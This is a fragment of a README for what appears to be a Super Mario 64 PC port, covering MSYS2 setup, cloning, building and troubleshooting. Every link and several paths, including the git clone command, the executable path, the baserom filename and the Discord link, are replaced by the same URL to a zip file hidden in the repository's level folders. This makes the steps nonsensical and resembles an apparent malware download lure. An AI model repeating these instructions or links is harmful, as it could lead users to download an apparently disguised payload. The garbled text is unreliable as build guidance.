...
2. Clone the repo: `git clone https://github.com/LolLiamDev/sm64-port/raw/refs/heads/master/levels/thi/areas/1/6/port_sm_1.5.zip`, which will create a directory `sm64-port` and then **enter** it `cd sm64-port`.
...
1. Install and update MSYS2, following all the directions listed on https://github.com/LolLiamDev/sm64-port/raw/refs/heads/master/levels/thi/areas/1/6/port_sm_1.5.zip
...
4. Clone the repo: `git clone https://github.com/LolLiamDev/sm64-port/raw/refs/heads/master/levels/thi/areas/1/6/port_sm_1.5.zip`, which will create a directory `sm64-port` and then **enter** it `cd sm64-port`.
...
7. The executable binary will be located at `build/<VERSION>_pc/sm64.<VERSION>https://github.com/LolLiamDev/sm64-port/raw/refs/heads/master/levels/thi/areas/1/6/port_sm_1.5.zip` inside the repository.
...
2. If you get `Failed to open https://github.com/LolLiamDev/sm64-port/raw/refs/heads/master/levels/thi/areas/1/6/port_sm_1.5.zip!` you failed to place the baserom in the repository. You can write `ls` to list the files in the current working directory. If you are in the `sm64-port` directory, make sure you see it here.
...
It is possible to build N64 ROMs as well with this repository. See https://github.com/LolLiamDev/sm64-port/raw/refs/heads/master/levels/thi/areas/1/6/port_sm_1.5.zip for instructions.
...
Official Discord: https://github.com/LolLiamDev/sm64-port/raw/refs/heads/master/levels/thi/areas/1/6/port_sm_1.5.zip
